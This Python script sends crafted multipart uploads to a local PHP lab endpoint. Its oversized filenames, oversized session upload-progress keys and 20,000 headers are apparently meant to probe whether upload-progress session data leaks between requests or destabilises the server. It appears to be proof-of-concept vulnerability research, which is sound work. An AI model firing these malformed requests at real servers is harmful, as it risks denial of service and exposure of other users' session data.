import socket, re, sys
B=b"GLM619"
def part(name, body, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None: d += b'; filename="' + filename + b'"'
    return b"--" + B + b"\r\n" + d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"
def pb(parts): return b"".join(parts) + b"--" + B + b"--\r\n"
def post_head(blen):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\nConnection: keep-alive\r\n\r\n").encode()
class KA:
    def __init__(self): self.s = socket.create_connection(("127.0.0.1", 8083), timeout=20)
    def send(self, head, body=None, timeout=150):
        self.s.sendall(head if body is None else head+body); self.s.settimeout(timeout); buf=b""
        while True:
            he=buf.find(b"\r\n\r\n")
            if he>=0:
                m=re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he+4+int(m.group(1)): return buf
            try: d=self.s.recv(65536)
            except socket.timeout: return buf+b"\n<TIMEOUT>"
            except ConnectionResetError: return buf+b"\n<RESET>"
            if not d: return buf+b"\n<EOF>"
            buf+=d
    def close(self): self.s.close()
case = sys.argv[1]
sid = "e"*32
if case == "ENC":
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
            part(b"u", b"y", filename=b"F"*(1024*1024))]
elif case == "PROGV":
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K"*(1024*1024)),
            part(b"u", b"", filename=b"f.txt")]
elif case == "HDR":
    hdrs = b"".join(f"X-{i}: v\r\n".encode() for i in range(20000))
    prod = [b"--" + B + b"\r\n" + hdrs + b"Content-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n"]
elif case == "BENIGN":  # no producer
    prod = None
cons = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
        part(b"u", b"y", filename=b"a.txt")]
c = pb(cons)
ka = KA()
if prod: 
    p = pb(prod); r1 = ka.send(post_head(len(p)), p); print("producer len", len(r1))
r2 = ka.send(post_head(len(c)), c)
ka.close()
i = r2.find(b"\r\n\r\n")
print("CONSUMER FULL BODY:"); print(r2[i+4:].decode(errors='replace'))
